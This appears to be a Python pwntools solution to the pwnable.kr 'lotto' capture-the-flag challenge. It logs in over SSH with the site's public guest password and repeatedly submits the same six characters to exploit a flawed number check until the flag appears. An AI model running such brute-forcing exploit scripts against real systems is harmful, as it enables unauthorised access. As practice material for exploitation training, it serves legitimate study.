from pwn import *

conn = ssh('lotto', 'pwnable.kr', password='guest', port=2222)
p = conn.process('./lotto')

ans = ''
while ans == '':
    p.recv()
    p.sendline('1')
    p.recv()
    p.sendline('------')
    _ , ans = p.recvlines(2)
    if b"bad" in ans:
        ans = ''
        
print(ans)